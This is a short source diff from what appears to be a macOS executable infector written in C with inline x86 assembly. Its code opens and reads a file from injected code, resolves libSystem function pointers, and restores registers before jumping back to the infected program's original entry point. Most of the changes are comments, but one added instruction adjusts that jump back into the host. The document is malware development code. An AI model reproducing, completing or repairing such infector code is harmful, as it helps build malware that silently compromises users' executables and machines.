@@ -1054,6 +1054,8 @@ l_break:
 	}
 
 	// find macosx version
+
+	// open the file
 	__asm__ __volatile__ {
 		push 0x0
 		push 0x7473696c
@@ -1083,6 +1085,7 @@ l_break:
 	if(file_handle <= 0)
 		goto OEP_CALL;
 
+	// read file
 	__asm__ __volatile__ {
 		push 0x400
 		lea eax, [file_buffer]
@@ -1150,7 +1153,7 @@ l_break:
 	//
 	// libSystem function pointer prototypes
 	//
-	int   (*iopen)			 (const char *, int, ...);
+	int   (*iopen)			(const char *, int, ...);
 	long  (*ilseek)			(int, _mOff_t, int);
 	int   (*iclose)			(int);
 	int   (*ichdir)			(const char *);
@@ -1412,6 +1415,7 @@ OEP_CALL:
 #ifdef WIN32
 			// Here we have to remove the fixed base (0x1000) and add
 			// the randomized one 	
+
 			uint32_t baseAddress = (uint32_t)_idyld_get_image_header(0);
 			uint32_t originalEP = infection->originalEP - 0x1000 + (uint32_t)baseAddress;
 
@@ -1428,6 +1432,7 @@ OEP_CALL:
 					mov edi, _edi
 					mov esp, _esp
 					mov ebp, originalEP; 
+					add ebp, 0x30	// start right where we left, FIXME: what about EP different from crtStart??
 					jmp ebp
 			}
 
